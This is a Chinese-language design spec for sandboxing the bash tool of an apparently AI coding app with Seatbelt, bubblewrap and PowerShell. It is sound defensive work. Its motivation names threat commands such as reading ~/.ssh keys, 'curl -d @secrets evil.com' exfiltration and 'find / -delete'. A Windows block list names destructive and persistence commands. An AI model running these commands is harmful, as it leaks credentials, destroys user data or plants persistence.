# ShellTools OS 沙箱设计（v2.4.0 系列 · 工具防御第二期）

- **状态**：已批准（brainstorming 完成，2026-09-10）
- **上游**：工具体系对标分析报告（vs Claude Code / Codex CLI / Cursor / Cline / Copilot）10 项改进之 P0-4
- **前序**：`2026-09-10-file-tools-defense-hardening-design.md`（v2.3.0，已合并）
- **下游**：spec #8「Windows 平台支持」（本 spec 沉淀 Windows shell 路径）

## 1. 背景与动机

bash 工具（`shell-tools.ts`）现有防线：命令黑名单 regex（11 条）+ 环境变量白名单（API key 不进子进程）+ cwd 锁 workspace + 30s 超时进程组 SIGKILL + 输出截断。**缺 OS 级文件系统/网络隔离**：`cat ~/.ssh/id_ed25519`、`curl -d @secrets evil.com`、`find / -delete` 均畅通（只要不撞黑名单）。

代码库已有 `sandbox/` 模块（M3 时代）为 v1.x「spawn node 子进程 + IPC」架构设计，v2.0 单进程化后生产零调用（README 认账的 v2.1 债务）。其中 `LinuxSandbox` 是假实现（warn + 普通 spawn，platformName 却叫 `linux-namespace`，审计误导）。

对标：Claude Code 用 macOS Seatbelt（deny default + 显式 allow）+ Linux bubblewrap，沙箱内默认禁网；Codex CLI 用 Landlock+seccomp。两者在 Windows 均不做 OS 沙箱，退化为人工审批。

## 2. 目标

1. bash 工具在 macOS（Seatbelt）/ Linux（bubblewrap）获得 OS 级隔离：读全盘（敏感目录除外）、写仅 workspace+tmp、默认禁网
2. Windows shell 执行路径本版落地：PowerShell（pwsh 优先）+ ExecutionPolicy 手动授权指引 + taskkill 杀树
3. Linux 无 bwrap 时：首启引导安装（pkexec 一键装 / 复制命令），strict 默认下 bash 拒绝裸奔
4. 沙箱状态全程可见：bash 结果首行带 `sandbox:` 标记，设置页展示探测状态

## 3. 非目标（明确不做）

- git / LSP / MCP 子进程不包沙箱（固定二进制 + 受控参数，风险面不同；v2.4+ 候选）
- 域名级网络白名单（见 §5.4 回收说明；v2.4+ 若做走本地过滤代理）
- Windows 全平台化（electron-builder win 目标、原生模块、路径适配）= spec #8
- cgroup 资源限制（旧模块 memoryLimitMB / cpuPercent 字段随删除退役）
- Codex 式 Landlock+seccomp（bwrap 语义更清晰、行业验证更充分；Landlock 留作 v3 候选）

## 4. 决策记录

| # | 决策 | 依据 |
|---|---|---|
| D1 | 删除旧 `sandbox/` 全部 6 文件（types/index/macos-sandbox/linux-sandbox/fallback-sandbox/wrap-child），原址重建 | 旧接口形态无消费者，假 Linux 实现有审计误导；YAGNI |
| D2 | 沙箱模式默认 `strict`（不可用则 bash 报错），设置可切 `permissive`（降级 + 标记） | 用户指令（启动引导装 bwrap）蕴含 strict 立场；对齐 Claude Code fail-closed 哲学 |
| D3 | Linux 缺 bwrap：首启弹卡 + 一键安装（pkexec）+ 复制命令降级 | 可用性与安全折中；pkexec 桌面 Linux 标配 |
| D4 | Windows 本版只做 shell 域（读法 1）；全平台化立 spec #8 | 工作量差一个数量级，避免沙箱做不深 |
| D5 | ExecutionPolicy **不代改**：探测 Restricted → 指引卡展示 `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned` 供用户手动执行 | 用户明确要求手动授权；且执行策略是用户系统级安全决策 |
| D6 | 沙箱内网络默认禁；设置开关 on/off；**域名白名单从承诺回收**（ Seatbelt 网络规则 IP/端口级、bwrap 仅 netns 级，域名过滤不可靠——假过滤比不过滤危险） | 用户选 A 后的诚实修正 |
| D7 | 文件系统剖面：读全盘 + 敏感目录 deny + 写仅 workspace+tmp；npm/pip 缓存注入 tmp | Claude Code 同款；用户选 A |
| D8 | Windows shell：PATH 有 `pwsh.exe` 用之否则 `powershell.exe`；调用不带 `-ExecutionPolicy Bypass`（带上即绕过 D5 闸门） | pwsh 非系统必带；5.1 必带 |

## 5. 架构设计

### 5.1 模块形态

```
electron/src/main/sandbox/
  types.ts     — ShellSandboxPolicy（platform 无关策略对象）、SandboxState、SpawnPlan、探测结果类型
  policy.ts    — buildPolicy(settings, workspaceDir): ShellSandboxPolicy（纯函数）
  macos.ts     — renderSeatbeltProfile(policy): string（回收旧 MacSandbox 生成逻辑并扩展）
  linux.ts     — buildBwrapArgs(policy): string[]（纯函数）
  windows.ts   — detectWindowsShell() / getExecutionPolicy() / buildKillTreeArgs(pid)
  probe.ts     — probeSandbox(): Promise<SandboxState>（boot 探测 + 缓存单例 + reprobe）
  settings.ts  — 沙箱设置 kv 读写（sandbox:mode / sandbox:network，缺省 strict/off）
  index.ts     — resolveShellSpawn(ctx): Promise<SpawnPlan> —— shell-tools 唯一接入点
```

`resolveShellSpawn` 内部读 SandboxState 单例 + kv 设置（单一真相源，杜绝调用方自行拼装）；测试经 `__setSandboxStateForTest` 钩子注入（对齐 memory provider 既有测试钩子模式）。

### 5.2 SpawnPlan 三态

```typescript
type SpawnPlan =
  | { kind: 'wrapped'; shell: string; args: string[]; tag: string; envAdditions: Record<string,string> }
  | { kind: 'plain';   shell: string; args: string[]; tag: string }   // tag 形如 'unsandboxed:bwrap 未安装'
  | { kind: 'blocked'; reason: string };                               // strict 且不可用
```

接入点：`shell-tools.ts execute()` 在黑名单 + env 白名单**之后**调用 `resolveShellSpawn`，替换现有 `process.platform === 'win32'` if-else。这是核心生产改动点（另加 boot 探测接线 + 设置 IPC + 首启弹卡）。

bash 结果首行追加 `sandbox: <seatbelt|bwrap|win-powershell|unsandboxed:<原因>>`，LLM 与用户可见，审计随 result 落库（零 schema 变更，无 migration）。

### 5.3 macOS Seatbelt 剖面

```
sandbox-exec -p <profile-file> /bin/bash -c '<command>'
```

```scheme
(version 1)
(deny default)
(allow file-read* (subpath "/"))
(deny file-read* (subpath "<home>/.ssh") (subpath "<home>/.gnupg")
         (subpath "<home>/.aws") (subpath "<home>/Library/Keychains"))
(allow file-write* (subpath "<workspace>") (subpath "/private/tmp"))
(allow process-exec process-fork)
(allow signal (target self))
(allow file-ioctl sysctl-read mach-lookup)
;; 网络开时追加：(allow network-outbound)；关时省略（deny default 兜底）
```

要点：
- deny 规则后置覆盖前置 allow（Seatbelt 后匹配优先语义）
- 所有路径 `fs.realpathSync` 解析后注入，含空格路径按 Seatbelt 字符串规则转义（`\"`）
- profile 文件写 `os.tmpdir()`，子进程退出后 best-effort 清理（回收旧实现模式）
- ⚠️ 容器是 Linux，Seatbelt 无法在本环境实测——profile 从 Claude Code 已知可用形态起步 + 快照测试锁字符串 + macOS 主机验收（§8）

### 5.4 Linux bubblewrap 剖面

```
bwrap
  --ro-bind / /
  --tmpfs <home>/.ssh --tmpfs <home>/.gnupg --tmpfs <home>/.aws --tmpfs <home>/.config/gcloud
  --bind <workspace> <workspace>
  --bind /tmp /tmp
  --dev /dev --proc /proc
  --unshare-net            # 网络关时；开网省略
  --new-session
  --die-with-parent
  /bin/bash -c '<command>'
```

要点：
- 敏感目录用空 tmpfs **覆盖隐藏**（bwrap 无法 deny ro-bind 子路径的标准技巧）；仅对 `fs.existsSync` 的目录生成对应 `--tmpfs`（不存在时 bwrap 会报错）
- `--dev /dev` + `--proc /proc`：node/git 运行需要
- `--new-session`：防 TIOCSTI 终端注入；`--die-with-parent`：主进程死则沙箱死
- 环境变量沿用应用层白名单（不 `--clearenv`，env 防线已在 buildSandboxEnv）

### 5.5 Windows PowerShell 路径

- 探测：PATH 有 `pwsh.exe` → 用之；否则 `powershell.exe`（系统必带）
- 调用形：`<shell> -NoProfile -NonInteractive -Command '<command>'`（args 数组直传 spawn，无二次解释；**不带 `-ExecutionPolicy Bypass`**——D5）
- 首启探测 `Get-ExecutionPolicy`；`Restricted` → 指引卡（§6.3）
- 杀树：`taskkill /PID <pid> /T /F`；现有 `detached + kill(-pid)` 在 win32 会抛异常，本 spec 分支修正（win32 下 `detached: false`）
- 黑名单增补（win32 侧）：`format`（卷格式化）、`Remove-Item -Recurse` 作用于盘根、`bcdedit`、`vssadmin delete shadows`、`reg add ...\Run`（自启动持久化）

### 5.6 网络策略

on/off 二值（settings `sandbox:network`，默认 off）。off：bwrap `--unshare-net` / Seatbelt 无 allow 行（deny default 兜底）；on：对应放行。仅影响沙箱内 bash；主进程 LLM API 调用不受影响。域名白名单已回收（D6）。

### 5.7 全平台通用

wrapped 模式下 env 追加注入：
- `npm_config_cache=$TMPDIR/npm-cache`
- `PIP_CACHE_DIR=$TMPDIR/pip-cache`

（写 tmp 不写 HOME，与「写仅 workspace+tmp」剖面自洽；npm 容忍缓存目录重定向，pip 官方支持）

## 6. 状态机与 UI

### 6.1 boot 探测（主进程启动，fire-and-forget 不阻塞）

| 平台 | 探测动作 | SandboxState 结果 |
|---|---|---|
| darwin | `sandbox-exec` 存在性冒烟 | `sandboxTool: 'seatbelt'` |
| linux | `bwrap --version`（2s 超时） | `sandboxTool: 'bwrap'` + 版本；失败置 unavailable + 原因 |
| win32 | pwsh/powershell 探测 + `Get-ExecutionPolicy` | `sandboxTool: null`（无 OS 沙箱）+ shellCommand + executionPolicy |

`SandboxState` 单例缓存 + `reprobe()`；探测失败不影响 app 启动，只影响 bash 可用性。

### 6.2 bash 执行决策（resolveShellSpawn，每次执行读当前设置）

```
linux/darwin 且沙箱可用            → wrapped（剖面 §5.3/5.4）
linux/darwin 且不可用 + strict     → blocked（报错含安装指引 + permissive 逃生门说明）
linux/darwin 且不可用 + permissive → plain + tag 'unsandboxed:<原因>'
win32                              → plain（PowerShell）+ tag 'win-powershell'
```

### 6.3 首启弹卡（右下角非模态，复用 P5 升级提示样式，kv 记忆「已忽略」）

- **Linux bwrap 缺失**：说明文案 + `[一键安装]`（`pkexec <pkg-mgr> install -y bubblewrap`，探测 apt/dnf/pacman/zypper；pkexec 不在则隐藏此钮）+ `[复制命令]`（实际探测到的命令）+ `[暂不]`；安装后自动 reprobe → 卡片刷新「沙箱已就绪」
- **Windows policy=Restricted**：说明 + 可复制命令 `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned` + `[我已授权，重新检测]`

### 6.4 设置页新分类「安全沙箱」（SettingsNav + panel）

- **沙箱模式**：`strict`（默认）/ `permissive` 单选，文案讲清语义（strict = 沙箱不可用则 bash 拒绝执行）
- **沙箱内网络出站**：关（默认）/ 开；文案明示「仅沙箱内 bash，不影响 LLM API 调用」
- **状态只读区**：`bwrap 0.11.0 · 已启用` / `sandbox-exec · 可用` / `pwsh 7.4 · 无 OS 沙箱` / `不可用：<原因>` + `[重新探测]`
- 图标 lucide `ShieldCheck`（16px / stroke 1.75），样式全走语义 token（v2.1 设计系统）

持久化 kv：`sandbox:mode` / `sandbox:network` / `sandbox:bwrapPromptDismissed` / `sandbox:winPolicyPromptDismissed`。**无 DB migration**。

### 6.5 IPC 面（4 通道）

`sandbox:getState`（设置 + 探测结果）/ `sandbox:updateSettings` / `sandbox:installBwrap`（触发 pkexec 流）/ `sandbox:reprobe`（含 Windows policy 重测）。preload + types.d.ts 双端同步（boundary-rules）。

## 7. 测试策略

| 层 | 手段 | 覆盖 |
|---|---|---|
| 剖面纯函数 | `renderSeatbeltProfile` / `buildBwrapArgs` 快照 | 网络 on/off、敏感目录存在/不存在、workspace 路径含空格转义、Seatbelt 字符串转义 |
| SpawnPlan | 注入 fake SandboxState + 设置 | 三态转换矩阵；blocked 文案；unsandboxed tag；win32 powershell 形态（platform mock） |
| 接线回归锁 | 跑真 `doExecuteTool('bash')` | 断言结果含 `sandbox:` 行（防「测试手动注入、生产未接线」——v2.3 spec #1 C1 教训） |
| 探测解析 | fake spawn 输出 | bwrap 版本串 / Get-ExecutionPolicy 输出 / pwsh 探测 |
| Windows 分支 | `process.platform` mock | 命令构造 / taskkill 分支 / detached=false |
| 真实 bwrap | 容器 `apt install bubblewrap` 后条件集成测试（`describe.skipIf(冒烟失败)`） | Docker 默认 seccomp 拦 user namespace 时跳过并文档记录（不造假绿） |
| Seatbelt 真跑 | ❌ 容器无法 | macOS 主机验收（§8） |

## 8. 主机验收清单

**macOS**：① strict 默认 bash 正常执行且结果带 `sandbox: seatbelt`；② `cat ~/.ssh/id_ed25519` 被拒；③ workspace 外写被拒；④ `curl baidu.com` 默认被拒、设置开网后通；⑤ `npm install` 全流程通（tmp 缓存注入生效）。

**Windows（如有机器）**：⑥ PowerShell 即时命令正常；⑦ `.ps1` 在 Restricted 下被拦、错误浮现给 LLM；⑧ 授权后 `.ps1` 可跑；⑨ 超时/中断 taskkill 杀整树。

## 9. 风险与开放问题

1. **Seatbelt profile 真机迭代**：mach-lookup/sysctl 白名单可能缺项（node/git/pty 变体），主机验收时按报错补行——快照测试保证改动可审
2. **容器 bwrap 预期不可用**：Docker seccomp 拦非特权 user namespace；条件测试自动跳过，真实 Linux 桌面为主战场
3. **pkexec 一键安装的发行版覆盖**：包管理器探测失败（冷门发行版/无 pkexec）降级为复制命令路径，不阻塞
4. **Windows 无真机**：代码 + platform mock 测试先行，真机验证并入 spec #8 主机验收
